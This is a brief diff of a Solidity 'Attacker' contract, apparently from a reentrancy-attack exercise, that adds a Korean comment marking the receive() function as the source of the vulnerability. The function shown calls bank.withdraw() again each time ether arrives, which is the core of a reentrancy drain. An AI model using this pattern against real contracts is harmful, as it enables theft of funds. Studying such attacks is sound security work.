@@ -30,7 +30,7 @@ contract Attacker {
     event Info(string info);
     Bank public bank;
     address public owner;
-    receive() payable external {
+    receive() payable external { //얘가 취약점의 원인
         if(address(msg.sender).balance>0) { // 6 ether
             bank.withdraw();
         }else{
